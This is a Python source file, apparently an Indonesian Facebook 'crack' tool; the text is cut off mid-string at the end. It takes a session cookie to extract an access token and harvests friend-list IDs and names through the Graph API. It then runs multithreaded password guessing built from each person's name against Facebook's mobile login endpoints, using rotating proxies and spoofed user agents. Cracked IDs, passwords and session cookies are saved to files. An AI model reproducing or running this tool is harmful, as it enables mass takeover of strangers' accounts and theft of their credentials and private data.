######## [ AYAM BETINA ] ########
import requests,bs4,json,os,sys,random,datetime,time,re
import urllib3,rich,base64
from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup as parser
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as nel
from rich import print as cetak
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from rich import print as rprint
from rich import pretty
from rich.text import Text as tekz
######## [ AYAM JANTAN ] ########
pretty.install()
CON=sol()
ugen2=[]
peler=[]
ugen=[]
cokbrut=[]
yakuza=[]
ses=requests.Session()
princp=[]
try:
	prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
	open('.prox.txt','w').write(prox)
except Exception as e:
	print('[[\x1b[1;92m•\x1b[1;97m] [\x1b[1;96mAlvino_adijaya_xy')
prox=open('.prox.txt','r').read().splitlines()

for agenku in range(1000):
	 rr,rc=random.randint,random.choice
	 az1 = str(rc(['PKQ1','QP1A','RP1A','QKQ1','PPR1','SP1A','TP1A','OPM1','RKQ1','SKQ1','TKQ1','UKQ1','01AQKQ1','QQ3A','QD4A','QQ1B']))
	 az2 = (f"{str(rr(5000,299999))}")
	 az3 = str(rc(['001','002','003','004','005','006','007','008','009','010','011','012','013','014','015','016','017','018','019','020']))
	 kombinasi_build = (f"{az1}.{az2}.{az3}")
	 ua_random = str(rc(['redmi note 8','redmi note 8 pro','Lenovo TB-Q706F',
	 'Lenovo TB-J607F','Lenovo PB-6505Y']))
	 ip1 = str(rc(['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18']))
	 ip2 = str(rc(['1','2','3','4','5','6','7','8','9','0']))
	 ip3 = str(rc(['1','2','3','4','5','6','7','8','9','0']))
	 iphone0 = (f"{ip1}_{ip2}_{ip3}")
	 iphone1 = str(rc(["605.1.15","534.5.4","531.48.3","533.17.9","535.50.4","535.29.5","532.9","534.14.7"]))
	 iphone2 = str(rc(["18F72","15E148","11A465","10B350","11A4449d","10B329","7B500","11B554a","13E233","13F69","13E238","9B206","9A334","11B651","11D167","8C148","8K2","7B314","10a523","8C148","8J2","1A543","12A405","8L1","8F190","8C148","8G4","8A293","8B117","19G82","15E148","18F72","20G75"]))
	 iphone3 = str(rc(["604.1","6531.48.3","6533.18.5","6535.50.4","6535.29.5","6531.22.7","605.1"]))
	 i = random.choice(['en-US','en-GB'])
	 oppo = random.choice(["CPH2437","CPH2351","CPH2048","CPH2389","CPH2359","CPH2363","CPH2211","PGX110","CPH1917","PBDM00","PAHM00","PCDM10","PCAT00","PCDM10","PCHM30","PCKM00","PCHM10"])
	 heytab = (f"HeyTapBrowser/{str(rr(2,40))}.{str(rr(0,10))}.{str(rr(0,99))}.{str(rr(0,9))}")
	 a = random.choice(["9.1.5","5.1.6","4.0.1","3.0.1","4.0.2","5.0.2","6.0.1","6.2.2","7.0.1","7.1.0","8.1.0","4.4.4","5.6.1","6.1.3"])
	 android = (f"{str(rr(5,14))}")
	 ch = (f"{str(rr(76,119))}.0.{str(rr(3000,10000))}.{str(rr(36,299))}")
	 k1 = (f"{str(rr(10,12))}")
	 k2 = (f"{str(rr(110,117))}.0.{str(rr(5000,5999))}.{str(rr(0,299))}")
	 ua_K = f"Mozilla/5.0 (Linux; Android 11; Mi 9T Pro Build/RKQ1.200826.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/92.0.4515.159 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/264.0.0.12.111;]"
	 ua1 = "Mozilla/5.0 (Linux; arm_64; Android 10; Mi 9T Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 YaApp_Android/20.115.1 YaSearchBrowser/20.115.1 BroPP/1.0 SA/3 Mobile Safari/537.36"
	 cobracan = str(rc([ua_K,ua1]))
	 ugen.append(cobracan)
######## [ AYAM JANDA ] ########
id,id2,loop,ok,cp,akun,oprek,method,lisensiku,taplikasi,tokenku,uid,lisensikuni= [],[],0,0,0,[],[],[],[],[],[],[],[]
cokbrut=[]
pwpluss,pwnya=[],[]
peler=[]
######## [ AYAM MUDA ] ########
def tahun(fx):
	if len(fx)==15:
		if fx[:10] in ['1000000000']       :tahunz = '2009'
		elif fx[:9] in ['100000000']       :tahunz = '2009'
		elif fx[:8] in ['10000000']        :tahunz = '2009'
		elif fx[:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:tahunz = '2009'
		elif fx[:7] in ['1000006','1000007','1000008','1000009']:tahunz = '2010'
		elif fx[:6] in ['100001']          :tahunz = '2010-2011'
		elif fx[:6] in ['100002','100003'] :tahunz = '2011-2012'
		elif fx[:6] in ['100004']          :tahunz = '2012-2013'
		elif fx[:6] in ['100005','100006'] :tahunz = '2013-2014'
		elif fx[:6] in ['100007','100008'] :tahunz = '2014-2015'
		elif fx[:6] in ['100009']          :tahunz = '2015'
		elif fx[:5] in ['10001']           :tahunz = '2015-2016'
		elif fx[:5] in ['10002']           :tahunz = '2016-2017'
		elif fx[:5] in ['10003']           :tahunz = '2018'
		elif fx[:5] in ['10004']           :tahunz = '2019'
		elif fx[:5] in ['10005']           :tahunz = '2020'
		elif fx[:5] in ['10006','10007','10008']:tahunz = '2021-2022'
		elif fx[:5] in ['10009']           :tahunz = '2023'
		elif fx[:5] in ['61550']           :tahunz = '2023'
		else:tahunz=''
	elif len(fx) in [9,10]:
		tahunz = '2008-2009'
	elif len(fx)==8:
		tahunz = '2007-2008'
	elif len(fx)==7:
		tahunz = '2006-2007'
	else:tahunz=''
	return tahunz
######## [ AYAM TUA ] ########
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[1;96m'
N = '\x1b[0m'    
Z = "\033[1;30m"
sir = '\033[41m\x1b[1;97m'
x = '\33[m' # DEFAULT
m = '\x1b[1;91m' #RED +
k = '\033[93m' # KUNING +
h = '\x1b[1;92m' # HIJAU +
hh = '\033[32m' # HIJAU -
u = '\033[95m' # UNGU
kk = '\033[33m' # KUNING -
b = '\33[1;96m' # BIRU -
p = '\x1b[0;34m' # BIRU +
######## [ AYAM BANCI ] ########
dic = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10':'October','11':'November','12':'December'}
dic2 = {'01':'January','02':'February','03':'March','04':'April','05':'May','06':'June','07':'July','08':'August','09':'September','10':'October','11':'November','12':'Devember'}
tgl = datetime.datetime.now().day
bln = dic[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
okc = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
cpc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
######## [ AYAM BADUT ] ########
def alvino_xy(u):
        for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.05)
def clear():
	os.system('clear')
def back():
	login()
######## [ AYAM BAU ] ########
def lonte():	
	print(f"""{M}
@@@@@@  @@@@@@  @@@@@@@ @@@  @@@ @@@@@@@  @@@  @@@
 !@@     @@!  @@@   @@!   @@!  @@@ @@!  @@@ @@!@!@@@
  !@@!!  @!@!@!@!   @!!   @!@  !@! @!@!!@!  @!@@!!@!
     !:! !!:  !!!   !!:   !!:  !!! !!: :!!  !!:  !!!
 ::.: :   :   : :    :     :.:: :   :   : : ::    :⠀""")
######## [ AYAM LONTE ] ########
def login():
	os.system('clear')
	lonte()
	cok = input(f'{k}Masukkan cookie yang masih perawan :{h} ')
	try:
		head = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36"}
		link = ses.get("https://web.facebook.com/adsmanager?_rdc=1&_rdr", headers=head, cookies={"cookie": cok})
		find = re.findall('act=(.*?)&nav_source', link.text)
		if len(find) == 0:print(f'> {m}cookie kamu invalid / ganti cookie lain !!!');time.sleep(2);exit()
		else:
			for x in find:
				xz = ses.get(f"https://web.facebook.com/adsmanager/manage/campaigns?act={x}&nav_source=no_referrer", headers = head, cookies={"cookie": cok})
				took = re.search('(EAAB\w+)',xz.text).group(1)
				open('.tok.txt', 'a').write(took);open('.cok.txt', 'a').write(cok)
				exit(f"Token : {took} \ncookies aktif")
	except Exception as e:exit(e)
######## [ AYAM KONTOL ] ########
def menu():
	try:
		token = open('.tok.txt','r').read()
		cok = open('.cok.txt','r').read()
	except (IOError,KeyError,FileNotFoundError):
		print('[×] Cookies Kadaluarsa ')
		time.sleep(5)
		login()
	try:
		info_datafb = ses.get(f"https://graph.facebook.com/me?fields=name,id&access_token={token}", cookies = {'cookies':cok}).json()
		nama = info_datafb["name"]
		uidfb = info_datafb["id"]
	except requests.exceptions.ConnectionError:
		exit(f"\n{P} [:] Tidak ada koneksi{P}")
	except KeyError:
		try:os.remove(".cok.txt");os.remove(".tok.txt")
		except:pass
		login()
	os.system('clear')
	lonte()
	print('            ,🔥🚀🚀𝐅𝐀𝐒𝐓 ??𝐑𝐀𝐂𝐊 𝐁𝐘 𝐆𝐒𝐇𝐑🚀🚀🔥')
	print(f'{H}[•• ────────────────────────────────────────── ••]')
	print(f'[{H}01{x}] {H}CRACK PUBLIK\n{x}[{H}02{x}] {M}CRACK MASAL\n{x}[{H}03{x}] {H}CEK RESULT\n{x}[{H}04{x}] {M}HAPUS COOKIE{x}')
	print(f'{H}[•• ────────────────────────────────────────── ••]')
	AT = input(f'[•] 𝙿𝙸𝙻𝙸𝙷 𝚃𝚘𝚍 : ')
	if AT in ['1','1']:
		idt = input(f'[•] 𝙼𝙰𝚂𝚄𝙺𝙰𝙽 𝙸𝙳 : ')
		dump(idt,"",{"cookie":cok},token)
		setting()
	if AT in ['2','02']:
		nge_crack()
	if AT in ['3','03']:
		result()
	elif AT in ['exit','4','logout']:
	   hapus_cookie =	os.system('rm -rf .token.txt && rm -rf .cok.txt')
	   print(f'[•] SUKSES HAPUS PRAWAN')
###----------[ DUMP ID PUBLIK ]----------###
def dump(idt,fields,cookie,token):
	try:
		headers = {
			"connection": "keep-alive", 
			"accept": "*/*", 
			"sec-fetch-dest": "empty", 
			"sec-fetch-mode": "cors",
			"sec-fetch-site": "same-origin", 
			"sec-fetch-user": "?1",
			"sec-ch-ua-mobile": "?1",
			"upgrade-insecure-requests": "1", 
			"user-agent": "Mozilla/5.0 (Linux; Android 11; AC2003) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36",
			"accept-encoding": "gzip, deflate",
			"accept-language": "id-ID,id;q=0.9"
		}
		if len(id) == 0:
			params = {
				"access_token": token,
				"fields": f"name,friends.fields(id,name,birthday)"
			}
		else:
			params = {
				"access_token": token,
				"fields": f"name,friends.fields(id,name,birthday).after({fields})"
			}
		url = ses.get(f"https://graph.facebook.com/{idt}",params=params,headers=headers,cookies=cookie).json()
		for i in url["friends"]["data"]:
			#print(i["id"]+"|"+i["name"])
			id.append(i["id"]+"|"+i["name"])
			sys.stdout.write(f"\r[•] 𝚃𝙾𝚃𝙰𝙻 𝙸𝙳 𝚈𝙰𝙽𝙶 𝚃𝙴𝚁𝙺𝚄𝙼𝙿𝚄𝙻 : {H}{len(id)}{P}"),
			sys.stdout.flush()
		dump(idt,url["friends"]["paging"]["cursors"]["after"],cookie,token)
	except:pass

######## [ AYAM MEMEK ] ########
def nge_crack():    
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
	except IOError:
	    exit()
	try:
		print('  •|•  How many ID,and enter the public ID  •|•')
		print(f'{P}[•• ────────────────────────────────────────── ••]')
		kumpulkan = int(input(f'[•] MAU BERAPA ID : '))
		print(f'{P}[•• ────────────────────────────────────────── ••]')
	except ValueError:
	    exit()
	if kumpulkan<1 or kumpulkan>1000:
	    exit()
	ses=requests.Session()
	bilangan = 0
	for KOTG49H in range(kumpulkan):
		bilangan+=1
		Masukan = input(f'[•] MASUKAN ID YANG KE  '+str(bilangan)+f' : ')
		uid.append(Masukan)
		print(f'{P}[•• ────────────────────────────────────────── ••]')
	for user in uid:
	    try:
	       head = (
	       {"user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36"
	       })
	       if len(id) == 0:
	           params = (
	           {
	           'access_token': token,
	           'fields': "friends"
	           }	          
	       )
	       else:
	           params = (
	           {
	           'access_token': token,
	           'fields': "friends"
	           }	           
	       )
	       url = requests.get('https://graph.facebook.com/{}'.format(user),params=params,headers=head,cookies={'cookies':cok}).json()
	       for xr in url['friends']['data']:
	           try:
	               woy = (xr['id']+'|'+xr['name'])
	               if woy in id:pass
	               else:id.append(woy)
	           except:continue
	    except (KeyError,IOError):
	      pass
	    except requests.exceptions.ConnectionError:
	        exit()
	try:
	      print('[∆] 𝚃𝙾𝚃𝙰𝙻 𝙸𝙳 𝚈𝙰𝙽𝙶 𝚃𝙴𝚁𝙺𝚄𝙼𝙿𝚄𝙻 : '+str(len(id))) 
	      setting() 
	except Exception as e:
	    print(e) 
	    exit()
#-----------------[ HASIL-CRACK ]-----------------#
def result():
	print(f'[{b}01{x}] {H}Hasil OK\n{x}[{b}02] {K}Hasil CP\n{x}[03] Kembali')
	kz = input(f'╰─ Pilih : ')
	if kz in ['2','02']:
		try:vin = os.listdir('CP')
		except FileNotFoundError:
			print(' ╰─  File Tidak Di Temukan ')
			time.sleep(3)
			back()
		if len(vin)==0:
			print(' ╰─  Anda Tidak Memiliki Hasil CP ')
			time.sleep(4)
			back()
		else:
			cih = 0
			lol = {}
			for isi in vin:
				try:hem = open('CP/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<10:
					nom = '0'+str(cih)
					lol.update({str(cih):str(isi)})
					lol.update({nom:str(isi)})
					print('['+nom+'] '+isi+' [ '+str(len(hem))+' Account ]'+x)
				else:
					lol.update({str(cih):str(isi)})
					print('['+str(cih)+'] '+isi+' [ '+str(len(hem))+' Account ]'+x)
			geeh = input(f'\n{P}{x}{H} ╰─  {x}{P}{x} {P}Select{x} : ')
			try:geh = lol[geeh]
			except KeyError:
				print(' ╰─  Pilih Yang Bener Bro ')
				exit()
			try:lin = open('CP/'+geh,'r').read().splitlines()
			except:
				print(' ╰─  File Tidak Di Temukan ')
				time.sleep(4)
				back()
			nocp=0
			for cpku in range(len(lin)):
				cpkuni=lin[nocp].split('|')
				cpkuh=f'# ID : {cpkuni[0]} PASSWORD : {cpkuni[1]}'
				sol().print(mark(cpkuh,style="yellow"))
				nocp +=1
			input('[ Klik Enter ]')
			menu()
	elif kz in ['1','01']:
		try:vin = os.listdir('OK')
		except FileNotFoundError:
			print(' ╰─  File Tidak Di Temukan ')
			time.sleep(4)
			back()
		if len(vin)==0:
			print(' ╰─  Anda Tidak Mempunyai File OK ')
			time.sleep(4)
			back()
		else:
			cih = 0
			lol = {}
			for isi in vin:
				try:hem = open('OK/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<80:
					nom = '0'+str(cih)
					lol.update({str(cih):str(isi)})
					lol.update({nom:str(isi)})
					print('['+nom+'] '+isi+' [ '+str(len(hem))+' Account ]'+x)
				else:
					lol.update({str(cih):str(isi)})
					print('['+str(cih)+'] '+isi+' [ '+str(len(hem))+' Account ]'+x)
			geeh = input('\n ╰─  Pilih : ')
			try:geh = lol[geeh]
			except KeyError:
				print(' ╰─  Pilih Yang Bener Bro ')
				exit()
			try:lin = open('OK/'+geh,'r').read().splitlines()
			except:
				print(' ╰─  File Tidak Di Temukan ')
				time.sleep(4)
				back()
			nocp=0
			for cpku in range(len(lin)):
				cpkuni=lin[nocp].split('|')
				cpkuh=f'# ID : {cpkuni[0]} PASSWORD : {cpkuni[1]}'
				sol().print(mark(cpkuh,style="green"))
				print(f'{h}{cpkuni[2]}{x}')
				nocp +=1
			input('[ Klik Enter ]')
			menu()
	elif kz in ['3','03']:
		back()
	else:
		print(' ╰─  Pilih Yang Bener Bro ')
		exit()
######## [ AYAM MERAH ] ########
def setting ():
	hu = '3'
	if hu in ['1','01']:
		for tua in sorted(id):
			id2.append(tua)

	elif hu in ['2','02']:
		muda=[]
		for bacot in sorted(id):
			muda.append(bacot)
		bcm=len(muda)
		bcmi=(bcm-1)
		for xmud in range(bcm):
			id2.append(muda[bcmi])
			bcmi -=1
	elif hu in ['3','03']:
		for bacot in id:
			xx = random.randint(0,len(id2))
			id2.insert(xx,bacot)
	else:
		print('>> Pilih Yang Bener Kontooll ')
		exit()
	print(' ')
	print(f'[{b}01{x}] {H}VALIDATE {x}{M} 𝚜𝚞𝚙𝚙𝚘𝚛𝚝 𝚠𝚒𝚏𝚒\n{x}[{b}02{x}] {H}ASYNC{x}')
	hc = input(f'[•] PILIH : ')
	if hc in ['1','01']:
		method.append('mobile')
	elif hc in ['2','02']:
		method.append('free')
	#elif hc in ['3','03']:
		#method.append('touch')
	#elif hc in ['4','04']:
		#method.append('mbasic')
	else:
		method.append('mobile')

	print(f'{H}[•• ────────────────────────────────────────── ••]')
	pwplus=input(f'{P}[•] Pw Tambahan? [ y/t ] : ')
	if pwplus in ['y','Y']:
		pwpluss.append('ya')
		pwku=input(f'[•] Pw : {K}')
		pwkuh=pwku.split(',')
		for xpw in pwkuh:
			pwnya.append(xpw)
	else:
		pwpluss.append('no')
	passwrd()
######## [ AYAM KUNING ] ########
def passwrd():
	print(f'{P}[•• ────────────────────────────────────────── ••]')
	print(f'{H}          MAINKAN MODPES SETIAP 500 ID{P}')
	print(f'{P}[•• ────────────────────────────────────────── ••]')
	with tred(max_workers=30) as pool:
		for anim in id2:
			idf,nmf = anim.split('|')[0],anim.split('|')[1].lower()
			frs = nmf.split(' ')[0]
			pwv = []
			if len(nmf)<6:
				if len(frs)<3:
					pass
				else:
					pwv.append(frs+'123')
					pwv.append(frs+'1234')
					pwv.append(frs+'12345')
					pwv.append(frs+'123456')
			else:
				if len(frs)<3:
					pwv.append(nmf)
				else:
					pwv.append(nmf)
					pwv.append(frs+'123')
					pwv.append(frs+'1234')
					pwv.append(frs+'12345')
					pwv.append(frs+'123456')
					pwv.append(frs+'321')
			if 'ya' in pwpluss:
				for xpwd in pwnya:
					pwv.append(xpwd)
			else:pass
			if 'mobile' in method:
				pool.submit(crack,idf,pwv)
			elif 'free' in method:
				pool.submit(crackfree,idf,pwv)
			#elif 'touch' in method:
				#pool.submit(cracktouch,idf,pwv)
			#elif 'mbasic' in method:
				#pool.submit(crackmbasic,idf,pwv)
			else:
				pool.submit(crack,idf,pwv)
	print(f'{M} ──────────────────────────────────────────{x}')
	print(f'[•]{h} OK : {h}%s '%(ok))
	print(f'[•]{k} CP : {k}%s '%(cp))
	print(f'{M} ──────────────────────────────────────────{x}')
	print('[•] type (y) to exit  ')
	woi = input('[•] chose : ')
	if woi in ['y','Y']:
		back()
	else:
		print(f'\t{x}>>{k} Good Bye Dadaahh{x} << ')
		time.sleep(2)
		exit()
######## [ AYAM JAGO ] ########
def crack(idf,pwv):
	global loop,ok,cp
	bo = random.choice([m,k,h,b,u,x])
	sys.stdout.write(f"\r{h}𝙿𝚛𝚎𝚖𝚒𝚞𝚖{P}|{P}{loop}{P}|{H}OK-{ok}{P}|{K}CP-{cp}")
	sys.stdout.flush()
	rr = random.randint
	rc = random.choice
	sllbff = [f"Mozilla/5.0 (Linux; Android 11; Mi 9T Pro Build/RKQ1.200826.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/92.0.4515.159 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/264.0.0.12.111;]"]
	mama = random.choice(sllbff) 
	ses = requests.Session()
	for pw in pwv:
		try:
			nip=random.choice(prox)
			proxs= {'http': 'socks4://'+nip}
			nip=random.choice(prox)
			proxs= {'http': 'socks5://'+nip}
			ses.headers.update = {'authority': 'd.facebook.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'zh-cn;',
    'cache-control': 'max-age=0',
    'dpr': '1.75',
    'sec-ch-prefers-color-scheme': 'dark',
    'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
    'sec-ch-ua-full-version-list': '"Not)A;Brand";v="24.0.0.0", "Chromium";v="116.0.5845.240"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-model': '"PEAM00"',
    'sec-ch-ua-platform': '"Android"',
    'sec-ch-ua-platform-version': '"12.0.0"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'none',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': mama,
    'viewport-width': '980',
}
			p = ses.get('https://d.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://d.facebook.com/login/save-device/","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=1.75; wd=412x814'
			heade = {'authority': 'd.facebook.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-US,en;q=0.9',
    'cache-control': 'max-age=0',
    'dpr': '1.75',
    'sec-ch-prefers-color-scheme': 'dark',
    'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
    'sec-ch-ua-full-version-list': '"Not)A;Brand";v="24.0.0.0", "Chromium";v="116.0.5845.240"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-model': '"SM-A326B"',
    'sec-ch-ua-platform': '"Android"',
    'sec-ch-ua-platform-version': '"13.0.0"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'none',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': mama,
    'viewport-width': '980',
}
			po = ses.post('https://d.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
			if "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print(f'\r{x}Email : {H}{idf}{N}\nPassworr : {K}{pw}\nCookie : {H}{kuki}{N}/nUser-Agent : {H}{mama}{N}\n')
				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
				os.popen("play-audio .ok.mp3")
				break
			elif "checkpoint" in ses.cookies.get_dict().keys():
				cp+=1
				print(f'\r{x}Email : {K}{idf}{N}\nPassword : {K}{pw}{N}\nUser-Agent : {K}{mama}{N}\n')     
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				os.popen("play-audio .cp.mp3")
				break
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(15)
	loop+=1
def crackfree(idf,pwv):
	global loop,ok,cp
	bo = random.choice(['🕞','🕙','🕒','🕛','🕙','🕖','🕞','🕦'])
	sys.stdout.write(f"\r[{bo}] {P}[{P}{loop}{P}/{P}{len(id)}{P}]/{P}[{H}{ok}{P}]/{P}[{K}{cp}{P}]  "),
	sys.stdout.flush()
	ua = random.choice(ugen)
	ses = requests.Session()
	for pw in pwv:
		try:
			ses.headers.update
			({
			"Host": "m.facebook.com",
			"cache-control": "max-age=0",
			"user-agent": ua,
			"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
			"sec-ch-ua": '" Not A;Brand";v="99", "Chromium";v="104"',
			"sec-ch-ua-mobile": "?1",
			"sec-fetch-site": "same-origin",
			"sec-fetch-mode": "cors",
			"sec-fetch-dest": "empty",
			"sec-fetch-user": "?1",
			"upgrade-insecure-requests": "1",
			"accept-language": "en-US','en-GB'"
			})
			p = ses.get("https://mbasic.facebook.com/login.php?skip_api_login=1&api_key=957549474255294&kid_directed_site=0&app_id=957549474255294&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv15.0%2Fdialog%2Foauth%3Fapp_id%3D957549474255294%26cbt%3D1715269115564%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df4086a2bf309e0cc6%2526domain%253Dshopee.co.id%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fshopee.co.id%25252Ff462ff7f32d3f5c0a%2526relation%253Dopener%26client_id%3D957549474255294%26display%3Dtouch%26domain%3Dshopee.co.id%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fshopee.co.id%252Fbuyer%252Flogin%253Ffrom%253D%25252F%2526next%253D%25252F%26locale%3Den_US%26logger_id%3Df34929ab27b84cd6d%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Dfdaa6531e7d872ef4%2526domain%253Dshopee.co.id%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fshopee.co.id%25252Ff462ff7f32d3f5c0a%2526relation%253Dopener%2526frame%253Dfde927a29a637d339%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26scope%3Dpublic_profile%252Cemail%26sdk%3Djoey%26version%3Dv15.0%26refsrc%3Ddeprecated%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Dfdaa6531e7d872ef4%26domain%3Dshopee.co.id%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fshopee.co.id%252Ff462ff7f32d3f5c0a%26relation%3Dopener%26frame%3Dfde927a29a637d339%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&rtime=1715269117&hrc=1&wtsid=rdr_09E1IX1K9lXOTDHnK&_rdr")
			dataa ={
			'lsd': re.search('name="lsd" value="(.*?)"',str(p.text)).group(1),
			'jazoest': re.search('name="jazoest" value="(.*?)"',str(p.text)).group(1),
			'm_ts': re.search('name="m_ts" value="(.*?)"',str(p.text)).group(1),
			'li': re.search('name="li" value="(.*?)"',str(p.text)).group(1),
			'try_number': '0', 'unrecognized_tries': '0',
			'email': idf,
			'pass': pw,
			'prefill_contact_point': '','prefill_source': '','prefill_type': '','first_prefill_source': '','first_prefill_type': '', 'had_cp_prefilled': 'false', 'had_password_prefilled': 'false', 'is_smart_lock': 'false', 'bi_xrwh': re.search('name="bi_xrwh" value="(.*?)"',str(p.text)).group(1)
			}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=554; wd=1440x2560'
			heade={
			"Host": "m.facebook.com",
			"content-length": f"{len(str(dataa))}",
			"x-fb-lsd": re.search('name="lsd" value="(.*?)"',str(p.text)).group(1),
			"origin": "https://m.facebook.com",
			"content-type": "application/x-www-form-urlencoded",
			"user-agent": ua,
			"accept": "*/*",
			"x-requested-with": "com.microsoft.bing",
			"sec-ch-ua": '"Chromium";v="106", "Google Chrome";v="106", "Not;A=Brand";v="99"',
			"sec-ch-ua-platform": '"Android"," ios"',
			"sec-ch-ua-mobile": "?1",
			"sec-fetch-site": "same-origin",
			"sec-fetch-mode": "cors",
			"sec-fetch-dest": "empty",
			"sec-fetch-user": "?1",
			"referer": "https://mbasic.facebook.com/login.php?skip_api_login=1&api_key=957549474255294&kid_directed_site=0&app_id=957549474255294&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv15.0%2Fdialog%2Foauth%3Fapp_id%3D957549474255294%26cbt%3D1715269115564%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df4086a2bf309e0cc6%2526domain%253Dshopee.co.id%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fshopee.co.id%25252Ff462ff7f32d3f5c0a%2526relation%253Dopener%26client_id%3D957549474255294%26display%3Dtouch%26domain%3Dshopee.co.id%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fshopee.co.id%252Fbuyer%252Flogin%253Ffrom%253D%25252F%2526next%253D%25252F%26locale%3Den_US%26logger_id%3Df34929ab27b84cd6d%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Dfdaa6531e7d872ef4%2526domain%253Dshopee.co.id%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fshopee.co.id%25252Ff462ff7f32d3f5c0a%2526relation%253Dopener%2526frame%253Dfde927a29a637d339%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26scope%3Dpublic_profile%252Cemail%26sdk%3Djoey%26version%3Dv15.0%26refsrc%3Ddeprecated%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23c